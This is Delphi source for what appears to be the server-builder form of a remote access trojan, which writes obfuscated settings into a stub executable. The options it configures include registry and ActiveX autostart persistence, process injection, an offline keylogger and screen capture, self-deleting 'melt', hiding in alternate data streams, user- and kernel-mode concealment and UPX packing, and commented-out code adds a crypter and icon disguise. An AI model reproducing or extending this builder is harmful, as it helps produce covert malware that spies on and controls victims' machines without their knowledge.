unit UnitCreateServer;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms, UnitSharedData,ImageHlp,
  Dialogs, StdCtrls, ExtCtrls, Spin, ComCtrls, Buttons, ImgList, IniFiles, Menus, ActiveX,
  SHellAPi, vIconChanger, ToolWin;

type
  TCreateServer = class(TForm)
    PopupMenu1: TPopupMenu;
    Remove1: TMenuItem;
    ImageList1: TImageList;
    Panel1: TPanel;
    SaveDialog1: TSaveDialog;
    OpenDialog1: TOpenDialog;
    CheckBox12: TCheckBox;
    ImageList2: TImageList;
    StatusBar1: TStatusBar;
    Image1: TImage;
    CheckBox14: TCheckBox;
    Shape1: TShape;
    OpenDialog2: TOpenDialog;
    ScrollBox7: TScrollBox;
    Panel2: TPanel;
    GroupBox1: TGroupBox;
    Label7: TLabel;
    Label4: TLabel;
    Label6: TLabel;
    Label8: TLabel;
    CheckBox4: TCheckBox;
    CheckBox5: TCheckBox;
    CheckBox3: TCheckBox;
    CheckBox10: TCheckBox;
    CheckBox11: TCheckBox;
    CheckBox7: TCheckBox;
    CheckBox8: TCheckBox;
    SpinEdit1: TSpinEdit;
    SpinEdit3: TSpinEdit;
    GroupBox2: TGroupBox;
    Label5: TLabel;
    RadioButton1: TRadioButton;
    RadioButton2: TRadioButton;
    RadioButton3: TRadioButton;
    RadioButton4: TRadioButton;
    RadioButton5: TRadioButton;
    Edit3: TEdit;
    Edit4: TEdit;
    CheckBox6: TCheckBox;
    CheckBox9: TCheckBox;
    GroupBox3: TGroupBox;
    Label10: TLabel;
    CheckBox13: TCheckBox;
    Edit9: TEdit;
    ListView1: TListView;
    Edit7: TEdit;
    SpinEdit2: TSpinEdit;
    BitBtn2: TBitBtn;
    GroupBox4: TGroupBox;
    Label2: TLabel;
    Label3: TLabel;
    Edit1: TEdit;
    Edit2: TEdit;
    GroupBox6: TGroupBox;
    Label1: TLabel;
    Edit8: TEdit;
    BitBtn4: TBitBtn;
    ScrollBox1: TScrollBox;
    ListView3: TListView;
    BitBtn6: TBitBtn;
    BitBtn5: TBitBtn;
    ToolBar1: TToolBar;
    ToolButton1: TToolButton;
    ImageList3: TImageList;
    GroupBox5: TGroupBox;
    CheckBox1: TCheckBox;
    Edit5: TEdit;
    CheckBox2: TCheckBox;
    Edit6: TEdit;
    BitBtn1: TBitBtn;
    ToolBar2: TToolBar;
    ToolButton2: TToolButton;
    procedure BitBtn2Click(Sender: TObject);
    procedure BitBtn1Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure BitBtn4Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure Remove1Click(Sender: TObject);
    procedure CheckBox13Click(Sender: TObject);
    procedure BitBtn5Click(Sender: TObject);
    procedure ListView3DblClick(Sender: TObject);
    procedure Image1Click(Sender: TObject);
    procedure BitBtn6Click(Sender: TObject);
    procedure ToolButton1Click(Sender: TObject);
    procedure ToolButton2Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
    LastProfile: string;
    IconFile: string;
    procedure LoadIniSettings(f: string);
    procedure SaveIniProfile(f: string);

  end;

  TCreateServerData = record
    AssignedGroup: string;
    AssignedName: string;
    InstallFolder: string;
    InstallName: string;
    Injection: string;
    UserInit: string;
    RegRun: string;
    Activex: string;
    RegRunKey: string;
    ActiveXKey: string;
    Persistent: string;
    Connections: string;
    CopyToAds: string;
    OfflineLogger: string;
    OfflineScreenCapture: string;
    Melt: string;
    UserMode: string;
    KernelMode: string;
    Password: string;

    SleepInterval: string;
    FolderSize: string;

  end;

var
  CreateServer: TCreateServer;
  ServerData: TCreateServerData;
  
implementation

{$R *.dfm}

function List2String(Li: TListview): string;
var
  i,x: integer;
begin
  Result := '';
  for x := 0 to Li.Items.Count -1 do begin
    Result := Result + Li.Items[x].Caption + ':' + Li.Items[x].SubItems[0] + ';';
  end;
end;

function Ca(St: string): string;
var
  i: integer;
  a: byte;
begin
  for i := length(St) downto 1 do begin
    A := ord(St[i]);
    result := result + char(a+1);
  end;
end;

procedure TCreateServer.BitBtn2Click(Sender: TObject);
var
  Li: TListItem;
begin
  Li := Listview1.Items.Add;
  Li.Caption := Edit7.Text;
  Li.SubItems.Add(inttostr(SpinEdit2.Value));
end;

function CreateGuid: string;
var
  ID: TGUID;
begin
  Result := '';
  if CoCreateGuid(ID) = S_OK then Result := GUIDToString(ID);
end;

procedure TCreateServer.BitBtn1Click(Sender: TObject);
var
  i: integer;
begin
  for i := 0 to 100 do begin
    Edit6.Text := CreateGuid;
    Application.ProcessMessages;
  end;
end;

procedure TCreateServer.LoadIniSettings(f: string);
var
  Ini: TIniFile;
  Temp,Connections: string;
  Li: TListItem;
begin
  Ini := TIniFile.Create(f);

  Edit8.Text := Ini.ReadString('CreateServer','Stub','');
  Edit1.Text := Ini.ReadString('CreateServer','Group','Assigned Group');
  Edit2.Text := Ini.ReadString('CreateServer','Name','Assigned Name');
  RadioButton1.Checked := Ini.ReadBool('CreateServer','ProgramFiles',False);
  RadioButton2.Checked := Ini.ReadBool('CreateServer','Windows',True);
  RadioButton3.Checked := Ini.ReadBool('CreateServer','System',False);
  RadioButton4.Checked := Ini.ReadBool('CreateServer','ApplicationData',False);
  RadioButton5.Checked := Ini.ReadBool('CreateServer','Custom',False);
  Edit3.Text := Ini.ReadString('CreateServer','Folder','');
  Edit4.Text := Ini.ReadString('CreateServer','FileName','Server.exe');
  Checkbox6.Checked := Ini.ReadBool('CreateServer','Ads',False);
  Checkbox9.Checked := Ini.ReadBool('CreateServer','Melt',False);
  Checkbox1.Checked := Ini.ReadBool('CreateServer','RegistryRun',False);
  Checkbox2.Checked := Ini.ReadBool('CreateServer','ActiveX',False);
  Edit5.Text := Ini.ReadString('CreateServer','RegistryRunName','');
  Edit6.Text := Ini.ReadString('CreateServer','ActiveXName','');
  Checkbox4.Checked := Ini.ReadBool('CreateServer','Inject',True);
  Checkbox5.Checked := Ini.ReadBool('CreateServer','Persist',False);
  Checkbox8.Checked := Ini.ReadBool('CreateServer','OfflineScreen',False);
  Checkbox7.Checked := Ini.ReadBool('CreateServer','OfflineKeys',True);
  Checkbox3.Checked := Ini.ReadBool('CreateServer','SafeMode',False);
  Checkbox10.Checked := Ini.ReadBool('CreateServer','UserMode',False);
  Checkbox11.Checked := Ini.ReadBool('CreateServer','KernelMode',False);
  Checkbox12.Checked := Ini.ReadBool('CreateServer','Compress',True);
  SpinEdit1.Value := Ini.ReadInteger('CreateServer','Delay',1);
  SpinEdit3.Value := Ini.ReadInteger('CreateServer','FolderSize',0);

  Checkbox14.Checked := Ini.ReadBool('CreateServer','ChangeIcon',False);
  IconFile := Ini.ReadString('CreateServer','IconFile','');

  try
    Image1.Picture.Bitmap := nil;
    Image1.Picture.LoadFromFile(IconFile);
  except
  end;


  Listview1.Clear;
  Connections := '';
  Connections := Ini.ReadString('CreateServer','Connections','');
  while Length(Connections) > 0 do begin
    temp := split(Connections,';',1);
    Delete(Connections,1,Length(Temp)+1);
    Li := Listview1.Items.Add;
    Li.Caption := split(Temp,':',1);
    Li.SubItems.Add(split(Temp,':',2));
  end;

  Ini.Free;
end;

function GetAttrib(FindData: TWIN32FindData):string;
begin
  if FindData.dwFileAttributes and $00000010 <> 0 then begin
    Result := 'File Folder';
  end else begin
    if FindData.dwFileAttributes and $00000020 <> 0 then Result := Result + 'A';
    if FindData.dwFileAttributes and $00000002 <> 0 then Result := Result + 'H';
    if FindData.dwFileAttributes and $00000001 <> 0 then Result := Result + 'R';
    if FindData.dwFileAttributes and $00000004 <> 0 then Result := Result + 'S';
  end;
end;

procedure FileList(path: string);
var
  FindData: TWIN32FindData;
  hFind: THandle;
  li: tlistitem;
begin
  path := includetrailingbackslash(path);
  hFind := FindFirstFile(pchar(Path + '*'), FindData);
  if hFind = INVALID_HANDLE_VALUE then exit;

  if GetAttrib(FindData) <> 'File Folder' then begin
    li := createserver.ListView3.Items.Add;
    li.Caption := FindData.cFileName;
    li.ImageIndex := 1;
  end;

  while FindNextFile(hFind, FindData) do begin

    if GetAttrib(FindData) <> 'File Folder' then begin
      li := createserver.ListView3.Items.Add;
      li.Caption := FindData.cFileName;
      li.ImageIndex := 1;
    end;

  end;
  Windows.FindClose(hFind);
end;

procedure TCreateServer.FormCreate(Sender: TObject);
begin
  Scrollbox1.BringToFront;
  FileList(ExtractFilePath(Application.ExeName) + 'Profiles\');
end;

procedure TCreateServer.BitBtn4Click(Sender: TObject);
begin
  if not opendialog1.Execute then exit;
  edit8.Text := opendialog1.FileName;
end;

procedure TCreateServer.SaveIniProfile(f: string);
var
  Ini: TIniFile;
  Temp,Connections: string;
  Li: TListItem;
begin
  if LastProfile = '' then exit;
  Ini := TIniFile.Create(LastProfile);
  Ini.WriteString('CreateServer','Stub',Edit8.Text);
  Ini.WriteString('CreateServer','Group',Edit1.Text);
  Ini.WriteString('CreateServer','Name',Edit2.Text);
  Ini.WriteBool('CreateServer','ProgramFiles',RadioButton1.Checked);
  Ini.WriteBool('CreateServer','Windows',RadioButton2.Checked);
  Ini.WriteBool('CreateServer','System',RadioButton3.Checked);
  Ini.WriteBool('CreateServer','ApplicationData',RadioButton4.Checked);
  Ini.WriteBool('CreateServer','Custom',RadioButton5.Checked);
  Ini.WriteString('CreateServer','Folder',Edit3.Text);
  Ini.WriteString('CreateServer','FileName',Edit4.Text);
  Ini.WriteBool('CreateServer','Ads',Checkbox6.Checked);
  Ini.WriteBool('CreateServer','Melt',Checkbox9.Checked);
  Ini.WriteBool('CreateServer','RegistryRun',Checkbox1.Checked);
  Ini.WriteBool('CreateServer','ActiveX',Checkbox2.Checked);
  Ini.WriteString('CreateServer','RegistryRunName',Edit5.Text);
  Ini.WriteString('CreateServer','ActiveXName',Edit6.Text);
  Ini.WriteBool('CreateServer','Inject',Checkbox4.Checked);
  Ini.WriteBool('CreateServer','Persist',Checkbox5.Checked);
  Ini.WriteBool('CreateServer','OfflineScreen',Checkbox8.Checked);
  Ini.WriteBool('CreateServer','OfflineKeys',Checkbox7.Checked);
  Ini.WriteBool('CreateServer','SafeMode',Checkbox3.Checked);
  Ini.WriteBool('CreateServer','UserMode',Checkbox10.Checked);
  Ini.WriteBool('CreateServer','KernelMode',Checkbox11.Checked);
  Ini.WriteString('CreateServer','Connections',List2String(Listview1));
  Ini.WriteBool('CreateServer','Compress',Checkbox12.Checked);
  Ini.WriteInteger('CreateServer','Delay',SpinEdit1.Value);
  Ini.WriteInteger('CreateServer','FolderSize',SpinEdit3.Value);
  Ini.WriteBool('CreateServer','ChangeIcon',Checkbox14.Checked);
  Ini.WriteString('CreateServer','IconFile',IconFile);
  Ini.Free;
end;

procedure TCreateServer.FormClose(Sender: TObject;
  var Action: TCloseAction);
begin
  SaveIniProfile('');
end;

procedure TCreateServer.Remove1Click(Sender: TObject);
begin
  if not assigned(LIstview1.Selected) then exit;
  listview1.Selected.Delete;
end;

procedure TCreateServer.CheckBox13Click(Sender: TObject);
begin
  if Checkbox13.Checked then begin
    Edit9.PasswordChar := '*';
    Edit9.Font.Style := [fsBold];
  end else begin
    Edit9.PasswordChar := #0;
    Edit9.Font.Style := [];
  end;
end;

procedure TCreateServer.BitBtn5Click(Sender: TObject);
var
  li: tlistitem;
  s: string;
  f: thandle;
begin
  s := inputbox('New Profile','Enter New Profile Name','');
  if s = '' then exit;

  if Listview3.FindCaption(0,s,false,true,false) <> nil then begin
    ShowMessage('Error Adding Profile');
    Exit;
  end;

  li := listview3.Items.Add;
  li.Caption := s;
  li.ImageIndex := 1;

  MakeSureDirectoryPathExists(pchar(extractfilepath(Application.ExeName) + 'Profiles\'));
  f := CreateFile(pchar(extractfilepath(Application.ExeName) + 'Profiles\' + s),GENERIC_READ,FILE_SHARE_READ,nil,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
  closehandle(f);
end;

procedure TCreateServer.ListView3DblClick(Sender: TObject);
begin
  if listview3.Selected = nil then exit;
  ScrollBox1.Hide;
  SaveIniProfile('');
  LastProfile := extractfilepath(Application.ExeName) + 'Profiles\' + listview3.Selected.Caption;
  loadinisettings(LastProfile);                                                                    
  Statusbar1.SimpleText := 'Current Profile: ' + listview3.selected.caption;
  ToolButton2.Enabled := True;
end;

procedure TCreateServer.Image1Click(Sender: TObject);
begin
  if not opendialog2.Execute then exit;
  IconFile := opendialog2.FileName;
  image1.Picture.LoadFromFile(opendialog2.FileName);
end;

procedure TCreateServer.BitBtn6Click(Sender: TObject);
begin
  if not DeleteFile(Extractfilepath(Application.ExeName) + 'Profiles\' + listview3.Selected.Caption) then begin
    ShowMessage('Error Deleting Profile');
    exit;
  end;
  Listview3.Selected.Delete;
end;

procedure TCreateServer.ToolButton1Click(Sender: TObject);
begin
  Scrollbox1.Show;
  Scrollbox1.BringToFront;
  ToolButton2.Enabled := False;
end;

procedure TCreateServer.ToolButton2Click(Sender: TObject);
var
  ResourceHandle: THandle;
  str: string;
  Stream: TMemoryStream;
  rfile: string;
begin
  if not SaveDialog1.Execute then exit;
  ServerData.AssignedGroup := Edit1.Text;
  ServerData.AssignedName := Edit2.Text;
  if Checkbox6.Checked then ServerData.CopyToAds := 'True' else ServerData.CopyToAds := 'False';
  if RadioButton1.Checked then ServerData.InstallFolder := '%PROGRAMFILES%';
  if RadioButton2.Checked then ServerData.InstallFolder := '%WINDOWS%';
  if RadioButton3.Checked then ServerData.InstallFolder := '%SYSTEM%';
  if RadioButton4.Checked then ServerData.InstallFolder := '%APPLICATIONDATA%';
  if RadioButton5.Checked then ServerData.InstallFolder := Edit3.Text;
  ServerData.InstallName := Edit4.Text;
  if Checkbox1.Checked then ServerData.RegRun := 'True'  else ServerData.RegRun := 'False';
  if Checkbox2.Checked then ServerData.Activex := 'True' else ServerData.Activex := 'False';
  if Checkbox3.Checked then ServerData.UserInit := 'True' else ServerData.UserInit := 'False';
  ServerData.RegRunKey := Edit5.Text;
  ServerData.ActiveXKey := Edit6.Text;
  if Checkbox4.Checked then ServerData.Injection := 'True' else ServerData.Injection := 'False';
  if Checkbox5.Checked then ServerData.Persistent := 'True' else ServerData.Persistent := 'False';
  if Checkbox7.Checked then ServerData.OfflineLogger := 'True' else ServerData.OfflineLogger := 'False';
  if Checkbox8.Checked then ServerData.OfflineScreenCapture := 'True' else ServerData.OfflineScreenCapture := 'False';
  ServerData.Connections := List2String(Listview1);
  if Checkbox9.Checked then ServerData.Melt := 'True' else ServerData.Melt := 'False';
  if Checkbox10.Checked then ServerData.UserMode := 'True' else ServerData.UserMode := 'False';
  if Checkbox11.Checked then ServerData.KernelMode := 'True' else ServerData.KernelMode := 'False';
  ServerData.Password := Edit9.Text;
  ServerData.SleepInterval := inttostr(60000 * SpinEdit1.Value);
  ServerData.FolderSize := inttostr(SpinEdit3.Value);

  str := ServerData.AssignedGroup + '|';
  Str := Str + ServerData.AssignedName + '|';
  Str := Str + ServerData.InstallFolder + '|';
  Str := Str + ServerData.InstallName + '|';
  Str := Str + ServerData.Injection + '|';
  Str := Str + ServerData.UserInit + '|';
  Str := Str + ServerData.RegRun + '|';
  Str := Str + ServerData.Activex + '|';
  Str := Str + ServerData.RegRunKey + '|';
  Str := Str + ServerData.ActiveXKey + '|';
  Str := Str + ServerData.Persistent + '|';
  Str := Str + ServerData.Connections + '|';
  Str := Str + ServerData.CopyToAds + '|';
  Str := Str + ServerData.OfflineLogger + '|';
  Str := Str + ServerData.OfflineScreenCapture + '|';
  Str := Str + ServerData.Melt + '|';
  Str := Str + ServerData.UserMode + '|';
  Str := Str + ServerData.KernelMode + '|';
  Str := Str + ServerData.Password + '|';
  Str := Str + ServerData.SleepInterval + '|';
  Str := Str + ServerData.FolderSize + '|';

  Str := Ca(Str);
  Edit8.Text := ExtractFilePath(Application.ExeName) + 'stub';
  CopyFile(pchar(Edit8.Text),pchar(SaveDialog1.FileName),False);

  ResourceHandle := BeginUpdateResource(pchar(SaveDialog1.FileName), True);
  UpdateResource(ResourceHandle, MakeIntResource(10), 'SETTINGS', 0,@Str[1], Length(Str));
  EndUpdateResource(ResourceHandle, False);

  {//WRITE SETTINGS TO STUB
  ResourceHandle := BeginUpdateResource(pchar(Edit8.Text), True);
  UpdateResource(ResourceHandle, MakeIntResource(10), 'SETTINGS', 0,@Str[1], Length(Str));
  EndUpdateResource(ResourceHandle, False);
  //LOAD STUB INTO STRING
  Stream := TMemoryStream.Create;
  Stream.LoadFromFile(Edit8.Text);
  SetString(Str,pchar(Stream.Memory),Stream.Size);
  Stream.Free;
  //ENCRYPT STUB
  Str := Ca(Str);
  //COPY CRYPTER STUB TO FILE NAME
  CopyFile(pchar(ExtractFilePath(Application.ExeName) + 'res'),pchar(SaveDialog1.FileName),False);
  //WRITE STUB TO CRYPTER STUB
  ResourceHandle := BeginUpdateResource(pchar(SaveDialog1.FileName), True);
  UpdateResource(ResourceHandle, MakeIntResource(10), 'RE1', 0,@Str[1], Length(Str));
  EndUpdateResource(ResourceHandle, False);}

  {try
    if Checkbox14.Checked then vIconChanger.ChangeIcon(SaveDialog1.FileName,IconFile,'MAINICON');
  except
    ShowMessage('Error Changing Icon');
  end;}

  //if CheckBox12.Checked then
  if MsgBox('Compress','Do You Want To Compress Server',MB_YESNO + MB_ICONQUESTION) = 'Yes' then begin
    ShellExecute(0,'open',pchar(ExtractFilePath(Application.ExeName) + 'upx.exe'),pchar(' -9 "' + SaveDialog1.FileName + '"'),'',SW_SHOWNORMAL);
  end;

  MsgBox('Complete','Create Server Complete',MB_OK + MB_ICONINFORMATION);
  //ShowMessage('Complete');
end;

end.
